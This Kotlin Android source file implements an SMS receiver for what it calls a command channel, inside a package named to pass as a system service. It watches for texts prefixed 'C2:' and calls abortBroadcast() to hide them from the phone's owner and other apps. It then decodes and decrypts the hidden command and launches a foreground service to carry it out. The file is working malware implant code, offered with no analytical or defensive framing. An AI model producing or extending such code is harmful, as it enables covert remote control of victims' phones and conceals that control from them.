// [context: Kotlin, Android API 26+, SMS command channel emergency fallback]
package com.system.service.network

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import com.system.service.core.C2Command
import com.system.service.core.CommandType
import com.system.service.crypto.PayloadDecryptor
import android.util.Base64

class SMSReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return

        for (msg in messages) {
            val body = msg.messageBody ?: continue
            if (!body.startsWith("C2:")) continue
            abortBroadcast()  // hide from other receivers
            val payload = body.removePrefix("C2:")
            processCommand(context, payload)
        }
    }

    private fun processCommand(context: Context, payload: String) {
        val bytes = Base64.decode(payload, Base64.DEFAULT)
        val plain = PayloadDecryptor.decrypt(bytes) ?: return
        val json = org.json.JSONObject(String(plain))
        val typeCode = json.optInt("type", -1)
        val type = CommandType.values().firstOrNull { it.code == typeCode } ?: return
        val cmd = C2Command(id = json.optString("id"), type = type)

        val svc = Intent(context, Class.forName("com.system.service.core.CoreService")).apply {
            putExtra("cmd_json", json.toString())
        }
        context.startForegroundService(svc)
    }
}
